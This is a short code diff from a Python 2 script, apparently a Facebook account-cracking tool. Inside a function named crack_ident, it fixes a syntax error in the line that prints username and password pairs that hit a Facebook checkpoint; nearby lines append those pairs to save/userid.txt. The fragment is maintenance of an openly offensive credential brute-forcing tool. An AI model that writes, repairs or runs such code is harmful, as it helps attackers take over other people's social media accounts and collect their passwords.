@@ -957,7 +957,7 @@ def crack_ident():
                                 okb.close()
                                 oks.append(user + pass5)
                             elif 'www.facebook.com' in w['error_msg']:
-                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user  ' | '  +  pass5
+                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass5
                                 cps.open('save/userid.txt', 'a')
                                 cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
                                 cps.close()
